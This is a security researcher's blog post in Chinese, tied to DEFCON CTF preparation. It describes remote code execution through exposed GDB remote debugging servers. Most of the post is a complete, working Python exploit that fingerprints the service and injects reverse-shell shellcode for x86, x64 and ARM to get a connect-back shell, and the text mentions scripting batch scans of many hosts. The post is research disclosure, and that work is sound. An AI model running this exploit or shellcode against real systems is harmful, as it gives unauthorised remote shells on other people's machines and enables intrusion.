---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2015-08-remote-code-execution-on-gdb-remote/
title: "Remote Code Execution through GDB Remote Debugging Protocol | Orange Tsai"
author: "Orange Tsai"
published: 2015-08-30T16:00:00.000Z
description: "在準備 DEFCON CTF 時額外想到的小玩具，很多人使用 GDB remote debugging 時為了方便遠端使用，會將 port 綁在 0.0.0.0 上使得攻擊者可以連接上做一些事情 至於可以做哪些事情，不來個遠端代碼執行就不好玩了XD 大部分的工作都基於 Turning arbitrary GDBserver sessions into RCE 這篇文章，修改部分則是加上 arm 及"
---

* * *

在準備 DEFCON CTF 時額外想到的小玩具，很多人使用 GDB remote debugging 時為了方便遠端使用，會將 port 綁在 0.0.0.0 上使得攻擊者可以連接上做一些事情

至於可以做哪些事情，不來個遠端代碼執行就不好玩了XD

大部分的工作都基於 [Turning arbitrary GDBserver sessions into RCE](http://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/) 這篇文章，修改部分則是加上 arm 及 x64 的支援以及把 code 改好看點….XD

比較 tricky 的部分則是 GDB 在 extended-remote 後，GDB 預設的處理器架構會是 i386，如果遠端的處理器架構非 x86 的架構下會失敗，所以必須用 set architecture 指定處理器架構

（原文章因為都在 x86 架構下所以沒這個問題XD）

但是在 run 之前無法知道所處的處理器架構所以變成一個很尷尬的狀態XD

另外一個有趣的是如何檢測掃描到的 port 是否為 GDB remote debugging protocol，送個

> $?#3f

就可以判斷，接著就可以寫成 script 就可以批次掃描處理了XD

最後 PoC，在本機跑

> gdbserver –remote-debug 0.0.0.0:31337 /bin/ls

配合下面 Exploit 就可以拿 shell XD

![](https://blog.orange.tw/posts/2015-08-remote-code-execution-on-gdb-remote/2b1affb9a03a5299-01.png)

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>``` | ```<br># coding: UTF-8<br># <br>import sys<br>import gdb<br>import socket<br>import struct<br>import binascii<br>DEBUG = False<br>GDB_SERVER = ('127.0.0.1', 12345)<br>CONNECT_BACK_HOST = '127.0.0.1'<br>CONNECT_BACK_PORT = 31337<br>def _set_pair(sc):<br>    ip   = socket.inet_aton( CONNECT_BACK_HOST )<br>    port = struct.pack('>H', CONNECT_BACK_PORT )<br>    return binascii.unhexlify(sc).replace(b'\xff'*2, port).replace(b'\x00'*4, ip)<br>def reverse_shell_x86():<br>    sc = '31c031db31c931d2b066b301516a066a016a0289e1cd8089c6b06631dbb30268' \<br>         '000000006668ffff6653fec389e16a10515689e156cd805b31c9b103fec9b03f' \<br>         'cd8075f831c052686e2f7368682f2f626989e3525389e15289e2b00bcd80'<br>    return _set_pair(sc)<br>def reverse_shell_x64():<br>    sc = '4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f054989c0' \<br>         '4831f64d31d24152c604240266c7442402ffffc7442404000000004889e66a10' \<br>         '5a41505f6a2a580f054831f66a035e48ffce6a21580f0575f64831ff57575e5a' \<br>         '48bf2f2f62696e2f736848c1ef0857545f6a3b580f05'<br>    return _set_pair(sc)<br>def reverse_shell_arm():<br>    sc = '01108fe211ff2fe102200121921a0f02193701df061c08a11022023701df3f27' \<br>         '0221301c01df0139fbd505a0921a05b469460b2701dfc0460200ffff00000000' \<br>         '2f62696e2f736800'<br>    return _set_pair(sc)<br>def gdb_exec(cmd):<br>    if DEBUG:<br>        gdb.execute( cmd )<br>    else:<br>        gdb.execute( cmd, True, True )<br>if __name__ == '__main__':<br>    gdb_exec('set confirm off')<br>    gdb_exec('set verbose off')<br>    ARCHS = {<br>        'x86': reverse_shell_x86(), <br>        'x64': reverse_shell_x64(), <br>        'arm': reverse_shell_arm()<br>    }<br>    for arch, shellcode in ARCHS.items():<br>        try:<br>            if arch == 'arm':<br>                gdb_exec('set architecture arm')<br>            if arch == 'x86':<br>                gdb_exec('set architecture i386')<br>            if arch == 'x64':<br>                gdb_exec('set architecture i386:x86-64')<br>            gdb_exec('target extended-remote %s:%d' % GDB_SERVER)<br>            bp = gdb.Breakpoint('*0', internal=True)<br>            try:<br>                gdb_exec('run')<br>            except gdb.error as e:<br>                pass<br>            bp.delete()<br>            for idx, ch in enumerate(shellcode):<br>                ch = ord(ch)<br>                if arch == 'arm':<br>                    gdb_exec('set *(unsigned char *)($pc + %d) = %d' % (idx, ch))<br>                if arch == 'x86':<br>                    gdb_exec('set *(unsigned char *)($eip + %d) = %d' % (idx, ch))<br>                if arch == 'x64':<br>                    gdb_exec('set *(unsigned char *)($rip + %d) = %d' % (idx, ch))<br>            gdb_exec('continue')<br>            gdb_exec('continue')<br>            exit()<br>        except gdb.error as e:<br>            print( '##### not %s' % arch )<br>``` |